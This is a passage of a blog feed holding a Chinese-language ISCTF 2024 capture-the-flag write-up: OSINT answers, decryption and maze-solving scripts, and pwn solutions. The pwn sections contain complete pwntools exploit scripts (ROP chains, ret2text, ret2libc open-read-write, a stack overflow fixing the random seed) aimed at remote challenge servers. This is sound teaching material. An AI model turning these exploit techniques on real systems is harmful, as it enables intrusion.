 b vuln</span><br><span class="hljs-comment">#                b checker</span><br><span class="hljs-comment">#                b guess</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;125.70.243.22&quot;</span>, <span class="hljs-number">31982</span>)<br>printer = <span class="hljs-number">0x400647</span><br>fmt = <span class="hljs-string">b&quot;%7$lln&quot;</span><br>io.sendafter(<span class="hljs-string">b&quot;Username:\n&quot;</span>, fmt)<br>io.sendafter(<span class="hljs-string">b&quot;password: \n&quot;</span>, <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">8</span>)<br><br>io.send(<span class="hljs-string">b&quot;1\n&quot;</span>)<br>sleep(<span class="hljs-number">3</span>)<br>io.send(<span class="hljs-string">b&quot;1\n&quot;</span>)<br><br>bextr_ret = <span class="hljs-number">0x400650</span><br>xlatb_ret = <span class="hljs-number">0x40064e</span><br>pop_rdi_ret = <span class="hljs-number">0x400661</span><br>stosb_rdi_al_ret = <span class="hljs-number">0x40065f</span><br>buffer = <span class="hljs-number">0x6002c0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_rbx</span>(<span class="hljs-params">b:<span class="hljs-built_in">int</span></span>):<br>    p = <span class="hljs-string">b&quot;&quot;</span><br>    p += p64(bextr_ret)<br>    p += p64(<span class="hljs-number">0x4000</span>)<br>    p += p64(b - <span class="hljs-number">0xD093</span>)<br>    <span class="hljs-keyword">return</span> p<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_al</span>(<span class="hljs-params">a:<span class="hljs-built_in">bytes</span>,offset:<span class="hljs-built_in">int</span></span>):<br>    log.success(<span class="hljs-string">&quot;&lt;&lt;&lt;&quot;</span>)<br>    tmp = <span class="hljs-built_in">next</span>(e.search(a)) - offset<br>    log.success(<span class="hljs-string">f&quot;&gt;&gt;&gt;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(tmp)&#125;</span>, a=<span class="hljs-subst">&#123;a&#125;</span>&quot;</span>)<br>    p = p64(xlatb_ret)<br>    <span class="hljs-keyword">return</span> set_rbx(tmp) + p<br> <br>is_first = <span class="hljs-literal">True</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_al</span>(<span class="hljs-params">val:<span class="hljs-built_in">bytes</span>,offset:<span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-keyword">global</span> is_first<br>    p = <span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> is_first:<br>        p += p64(pop_rdi_ret)<br>        p += p64(buffer)<br>        is_first = <span class="hljs-literal">False</span><br>    p += p64(stosb_rdi_al_ret)<br>    <span class="hljs-keyword">return</span> set_al(val,offset) + p<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_str</span>(<span class="hljs-params">s:<span class="hljs-built_in">bytes</span></span>):<br>    p=<span class="hljs-string">b&quot;&quot;</span><br>    last_al = <span class="hljs-number">0x0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        p += save_al(p8(i),last_al)<br>        last_al = i<br>    <span class="hljs-keyword">return</span> p<br> <br> <br>payload = write_str(<span class="hljs-string">b&quot;flag&quot;</span>)<br>payload += p64(pop_rdi_ret)<br>payload += p64(buffer)<br>payload += p64(printer)<br><br>io.sendafter(<span class="hljs-string">b&quot;success!\n&quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">8</span>+payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ISCTFwp</title>
    <link href="/2024/11/16/ISCTFwp/"/>
    <url>/2024/11/16/ISCTFwp/</url>
    
    <content type="html"><![CDATA[<h1 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="小蓝鲨的签到01"><a href="#小蓝鲨的签到01" class="headerlink" title="小蓝鲨的签到01"></a>小蓝鲨的签到01</h4><p>扫码即得flag</p><h4 id="小蓝鲨的签到02"><a href="#小蓝鲨的签到02" class="headerlink" title="小蓝鲨的签到02"></a>小蓝鲨的签到02</h4><p>strings命令查找即得flag<br><img src="/wpsrc/misc02.png"></p><h4 id="游园地1"><a href="#游园地1" class="headerlink" title="游园地1"></a>游园地1</h4><blockquote><p>开盒题都在武汉江汉路附近，武带人狂喜</p></blockquote><p>谷歌搜图，<a href="">https://news.qq.com/rain/a/20231023A06PFW00</a> 就有个极其相似的地方，查得此地为武汉中山公园。<br>故flag为ISCTF{湖北省_武汉市_江汉区_中山公园}</p><h4 id="游园地2"><a href="#游园地2" class="headerlink" title="游园地2"></a>游园地2</h4><p>继续谷歌搜图，<a href="">https://www.taptap.cn/moment/592096524821860169</a> 有个几乎一模一样的图，看评论区知道这个是【充能国安路】的原型。<br>搜充能国安路，<a href="">https://blog.l3zc.com/2023/08/wuhan-trip/#%E5%85%85%E8%83%BD%E5%9B%BD%E5%AE%89%E8%B7%AF</a> 这里搞出了游戏名和原型街道，高德一搜竟然还是武汉江汉区的地方(<del>你们二次元是有多喜欢江汉路啊</del>)<br>得到flag:ISCTF{湖北省_武汉市_江汉区_鸣笛1988商业街_恋爱绮谭}</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h4 id="EzRe"><a href="#EzRe" class="headerlink" title="EzRe"></a>EzRe</h4><p>动调发现核心加密逻辑在这里：<br><img src="/wpsrc/re1.png" alt="alt text"><br>又知道加密后的字符串<code>QKEMK&#123;7JB5_i5_W3SllD_3z_W3&#125;</code>，直接解密即可:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs Python">key = <span class="hljs-string">&quot;ISCTF&quot;</span><br>sercet = <span class="hljs-string">&quot;QKEMK&#123;7JB5_i5_W3SllD_3z_W3&#125;&quot;</span><br>flag = []<br>j = <span class="hljs-number">0</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">(flag + key)%26 + &quot;A&quot; = QKEMK&#123;7JB5_i5_W3SllD_3z_W3&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sercet:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(i) &lt; <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;A&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-built_in">ord</span>(i) &gt; <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;Z&quot;</span>):<br>        flag.append(i)<br>        j+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">continue</span><br>    o = <span class="hljs-built_in">ord</span>(i)-<span class="hljs-built_in">ord</span>(key[j%<span class="hljs-number">5</span>])<br>    <br>    o = o%<span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;A&quot;</span>)<br>    <span class="hljs-built_in">print</span>(o)<br>    flag.append(<span class="hljs-built_in">chr</span>(o))<br>    j+=<span class="hljs-number">1</span><br>    <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(flag))<br></code></pre></td></tr></table></figure><h4 id="你知道-elf文件嘛"><a href="#你知道-elf文件嘛" class="headerlink" title="你知道.elf文件嘛"></a>你知道.elf文件嘛</h4><p>拖进IDA发现竟然全是LOAD段，无从下手，干脆先随便执行一下算了……执行后发现只要按要求输入base64码表即可get flag。<br><img src="/wpsrc/re02.png" alt="alt text"></p><h4 id="《回忆安魂曲》–第二章：当记忆被割裂"><a href="#《回忆安魂曲》–第二章：当记忆被割裂" class="headerlink" title="《回忆安魂曲》–第二章：当记忆被割裂"></a>《回忆安魂曲》–第二章：当记忆被割裂</h4><p>拖进IDA尝试F5反编译，几乎所有函数都飘红冒出JUMPOUT，显然是花指令。观察发现程序实际上是<strong>把地址加载到栈上</strong>，再利用复杂的指令进行<code>jmp rax</code>跳转。尝试nop+patch恢复似乎没什么卵用，毕竟栈帧调用及其费解，难以恢复正常。<br>做这题的是pwn手，于是在IDA调试没出什么成果的情况下果断采用pwndbg调试，终于缕清了程序逻辑：<br><img src="/wpsrc/re3.png"><br>发现数据段上有ans和key，基本上就是<code>answer</code>和<code>key</code>了。利用pwndbg逐步审计汇编代码，发现程序的加密函数enc逻辑如下：</p><ol><li>设当前字符为<code>now</code>,索引为<code>i</code></li><li>now ^&#x3D; (0x66+i)</li><li>now ^&#x3D; 0x52</li><li>now +&#x3D; 6</li><li>now ^&#x3D; (key[i]+i)</li></ol><p>缕清了加密逻辑、找到了密文和密钥之后，解密就不难了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python">ans = <span class="hljs-string">b&quot;\xea\x0c\x1a\x11\xf6\x2c\x1d\x3e\x17\x35&quot;</span> \<br>      <span class="hljs-string">b&quot;\x29\xf4\x39\x39\xd3&quot;</span> \<br>      <span class="hljs-string">b&quot;\xc3\x2d\x00\x10\x30\x3d\xcc\x00\xd3\xc0&quot;</span> \<br>      <span class="hljs-string">b&quot;\x4b\xc6\x11\xc7\x29\x3e&quot;</span> \<br>      <span class="hljs-string">b&quot;\xba\x60\x90\x34&quot;</span><br>      <br>key = <span class="hljs-string">b&quot;i_can_reverse_but_i_can_not_have_you&quot;</span><br>l = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key)):<br>    now = ans[i]^(key[i]+i)<br>    now -= <span class="hljs-number">6</span><br>    now ^=<span class="hljs-number">0x52</span><br>    now ^= (<span class="hljs-number">0x66</span>+i)<br>    now %=<span class="hljs-number">128</span><br>    l.append(<span class="hljs-built_in">chr</span>(now))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(l))<br></code></pre></td></tr></table></figure><h4 id="《回忆安魂曲》–第三章：逃不出的黑墙"><a href="#《回忆安魂曲》–第三章：逃不出的黑墙" class="headerlink" title="《回忆安魂曲》–第三章：逃不出的黑墙"></a>《回忆安魂曲》–第三章：逃不出的黑墙</h4><p>迷宫<del>饭</del>题，先从IDA中把迷宫提出来，再让AI写个BFS脚本查路径就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs Python">puzzle = [<br>    <span class="hljs-string">&quot;###############################P#...............#...#.......#.###&quot;</span>,<br>    <span class="hljs-string">&quot;##.###.#####.#.###.#####.#.....#...#.#.....#...#.#...#.#####.#.##&quot;</span>,<br>    <span class="hljs-string">&quot;#.#.#######.#.#.###.#C..#.#.#...#.#...#...#.#.#...#.#.#.#.#.###.#&quot;</span>,<br>    <span class="hljs-string">&quot;.#.#.###.#.#.#.#.#.#.#.#...#...#.#.......#.#.#.###.#.###.#####.##&quot;</span>,<br>    <span class="hljs-string">&quot;#######.###.#...#...#.....#.#.......#...#.#.#####.#####.#.#.#####&quot;</span>,<br>    <span class="hljs-string">&quot;.###.#...#...#...#...#...#...#.#...#.###.#.###.#.#######.#.#.#.#.&quot;</span>,<br>    <span class="hljs-string">&quot;#...#.#.#...#.#...#...#...#.#.###.#.#.#####.#.#.#.#######.###.#..&quot;</span>,<br>    <span class="hljs-string">&quot;.#.....#...#.#.#...#.....#.#########.#####.#.###.#.###.#.#.....#.&quot;</span>,<br>    <span class="hljs-string">&quot;#...#...#...#...#.#.#.#.#.#.#.###.#.#####.###.#.#.#...#.#...#.#..&quot;</span>,<br>    <span class="hljs-string">&quot;.#...#...#...#.#.###.###.#.#####.#.###.###.#.#...#.#.#.......#.#.&quot;</span>,<br>    <span class="hljs-string">&quot;..#.#...#.#####.#.#######.#.#####.#.###.#...#.#.......#.#...#...#&quot;</span>,<br>    <span class="hljs-string">&quot;.#..E#.#.#.#.#######.###.#.#####.#.#.#...#.............#.....#.#.&quot;</span>,<br>    <span class="hljs-string">&quot;#.###############.#######.#.#.#.........#...#...#.....#...#.#.###&quot;</span>,<br>    <span class="hljs-string">&quot;####.#.#.#####.#.#######.#.......#...#.......#.........&quot;</span><br>]<br>puzzle = <span class="hljs-string">&quot;&quot;</span>.join(puzzle)<br>p = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(puzzle), <span class="hljs-number">30</span>):<br>    p.append(<span class="hljs-built_in">list</span>(puzzle[i:i+<span class="hljs-number">30</span>]))<br>    <br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> p:<br>    <span class="hljs-built_in">print</span>(j)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">##############################</span><br><span class="hljs-string">#P#...............#...#.......</span><br><span class="hljs-string">#.#####.###.#####.#.###.#####.</span><br><span class="hljs-string">#.....#...#.#.....#...#.#...#.</span><br><span class="hljs-string">#####.#.###.#.#######.#.#.###.</span><br><span class="hljs-string">#...#.#.#...#.#...#...#.#.#...</span><br><span class="hljs-string">#.#.#.#.#.###.#.#.#.###.#.#.#.</span><br><span class="hljs-string">#.#.#.#.#...#...#.#.......#.#.</span><br><span class="hljs-string">#.###.#.###.#####.#########.##</span><br><span class="hljs-string">#.#...#...#.....#.#.......#...</span><br><span class="hljs-string">#.#.#####.#####.#.#.#####.###.</span><br><span class="hljs-string">#...#...#...#...#...#...#.#...</span><br><span class="hljs-string">#.###.#.###.#.#######.#.#.#.#.</span><br><span class="hljs-string">#...#.#.#...#.#...#...#...#.#.</span><br><span class="hljs-string">###.#.#.#####.#.#.#.#######.##</span><br><span class="hljs-string">#.#...#.....#...#.#.#...#.....</span><br><span class="hljs-string">#.#########.#####.#.###.#.###.</span><br><span class="hljs-string">#.#.....#.#...#...#...#...#.#.</span><br><span class="hljs-string">#.#.#.#.#.###.#.#####.###.#.#.</span><br><span class="hljs-string">#...#.#...#.#...#...#...#...#.</span><br><span class="hljs-string">#.###.###.#.#####.#.###.###.#.</span><br><span class="hljs-string">#...#.#.#.......#.#...#.#...#.</span><br><span class="hljs-string">#####.#.#######.#.#####.#.###.</span><br><span class="hljs-string">#...#.#.......#.#...#...#.#..E</span><br><span class="hljs-string">#.#.#.#.#######.###.#.#####.#.</span><br><span class="hljs-string">#.#...#.............#.....#.#.</span><br><span class="hljs-string">#.###############.#######.#.#.</span><br><span class="hljs-string">#.........#...#...#.....#...#.</span><br><span class="hljs-string">#.#######.#.#.#####.#.#######.</span><br><span class="hljs-string">#.......#...#.......#.........</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>(<span class="hljs-params">l, startX, startY, row, col</span>):<br>    <span class="hljs-comment"># 定义方向向量，上下左右分别为 w, s, a, d</span><br>    directions = &#123;<span class="hljs-string">&#x27;l&#x27;</span>: (-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>), <span class="hljs-string">&#x27;o&#x27;</span>: (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>), \<br>        <span class="hljs-string">&#x27;v&#x27;</span>: (<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>), <span class="hljs-string">&#x27;e&#x27;</span>: (<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)&#125;<br>    <span class="hljs-comment"># 初始化队列</span><br>    queue = deque([(startX, startY, <span class="hljs-string">&quot;&quot;</span>)])  <span class="hljs-comment"># 存储坐标和路径</span><br>    visited = <span class="hljs-built_in">set</span>((startX, startY))  <span class="hljs-comment"># 记录访问过的节点</span><br>    <br>    <span class="hljs-comment"># BFS 遍历</span><br>    <span class="hljs-keyword">while</span> queue:<br>        x, y, path = queue.popleft()<br>        <br>        <span class="hljs-comment"># 如果到达终点</span><br>        <span class="hljs-keyword">if</span> l[x][y] == <span class="hljs-string">&#x27;E&#x27;</span>:<br>            <span class="hljs-keyword">return</span> path<br>        <br>        <span class="hljs-comment"># 遍历四个方向</span><br>        <span class="hljs-keyword">for</span> direction, (dx, dy) <span class="hljs-keyword">in</span> directions.items():<br>            nx, ny = x + dx, y + dy<br>            <br>            <span class="hljs-comment"># 检查边界和是否已访问以及是否为墙</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= nx &lt; row <span class="hljs-keyword">and</span> <span class="hljs-number">0</span> &lt;= ny &lt; \<br>                col <span class="hljs-keyword">and</span> (nx, ny) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> \<br>                    visited <span class="hljs-keyword">and</span> l[nx][ny] != <span class="hljs-string">&#x27;#&#x27;</span>:<br>                visited.add((nx, ny))<br>                queue.append((nx, ny, path + direction))<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No path found&quot;</span><br><br>    <br><span class="hljs-built_in">print</span>(solve(p, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">30</span> ,<span class="hljs-number">30</span>))<br></code></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h4 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h4><p>nc就给flag，甚至不用cat。哪怕是签到题也显得过于简单了。</p><h4 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h4><p>普通的ret2text，给了后门函数，数组索引越界。需要注意的是溢出会覆盖i，i的值必须精心布置才行；另外要ret到那个lea指令处，防止栈不对齐导致错误。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main&quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>,<span class="hljs-number">20162</span>)<br><br>io.sendafter(<span class="hljs-string">b&quot;first i need your team id\n&quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">40</span> + <span class="hljs-string">b&quot;admin\x00&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    io.sendlineafter(<span class="hljs-string">b&quot;birthday\n&quot;</span>, <span class="hljs-string">b&quot;5&quot;</span>)<br>    <br>    <br>io.sendlineafter(<span class="hljs-string">b&quot;birthday\n&quot;</span>, <span class="hljs-string">b&quot;4198942&quot;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="ret2orw"><a href="#ret2orw" class="headerlink" title="ret2orw"></a>ret2orw</h4><p>板子题，开了沙箱禁用<code>execve</code>，用ret2libc同款手法打orw即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>puts_plt = e.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = e.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>pop_rdi = <span class="hljs-number">0x4012ce</span><br>ret = pop_rdi + <span class="hljs-number">1</span><br>main = <span class="hljs-number">0x4012a1</span><br>bss = <span class="hljs-number">0x4040a0</span><br>flag = bss + <span class="hljs-number">0x100</span><br><br><span class="hljs-built_in">print</span>(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag&quot;</span>))<br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b vuln</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>,<span class="hljs-number">20347</span>)<br>get_libc = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">32</span> + <span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">8</span> + p64(pop_rdi) + p64(puts_got) \<br>    + p64(puts_plt) + p64(main)<br>io.sendafter(<span class="hljs-string">b&quot;oh,what&#x27;s this?\n&quot;</span>, get_libc)<br>puts_addr = u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br>open_addr = libc_base + libc.sym[<span class="hljs-string">&quot;open&quot;</span>]<br>read_addr = libc_base + libc.sym[<span class="hljs-string">&quot;read&quot;</span>]<br>pop_rsi = libc_base + <span class="hljs-number">0x2be51</span><br>pop_rdx = libc_base + <span class="hljs-number">0x11f2e7</span><br><br><br>payload = <span class="hljs-string">b&quot;c&quot;</span>*<span class="hljs-number">32</span> + <span class="hljs-string">b&quot;d&quot;</span>*<span class="hljs-number">8</span><br>payload += p64(pop_rsi) + p64(bss) + p64(read_addr)<br>payload += p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) +\<br>     p64(pop_rdx) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)+ p64(open_addr)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + \<br>    p64(flag) + p64(pop_rdx) + p64(<span class="hljs-number">0x100</span>) + p64(<span class="hljs-number">0</span>)+ p64(read_addr)<br>payload += p64(pop_rdi) + p64(flag) + p64(puts_addr)<br><br>io.send(payload)<br>pause()<br>io.send(<span class="hljs-string">&quot;./flag&quot;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="ez-game"><a href="#ez-game" class="headerlink" title="ez_game"></a>ez_game</h4><p>普通的打随机数，好处是可以栈溢出控制seed，不会有远程和本地时间差导致的错误。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>sh = <span class="hljs-number">0x4012fc</span><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>, <span class="hljs-number">33258</span>)<br>lib = cdll.LoadLibrary(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br><br>io.sendlineafter(<span class="hljs-string">b&quot;Enter your username: &quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">400</span> + p64(<span class="hljs-number">0</span>))<br><br>lib.srand(<span class="hljs-number">0</span>) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>():<br>    res = lib.rand()<br>    <span class="hljs-keyword">if</span> res &lt; <span class="hljs-number">0</span>:<br>        res %= <span class="hljs-number">7</span><br>        res -= <span class="hljs-number">7</span><br>        res += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        res %= <span class="hljs-number">7</span><br>        res += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(res).encode()<br><br> <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20001</span>):<br>    io.sendline(r())<br>    <br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="0verf10w"><a 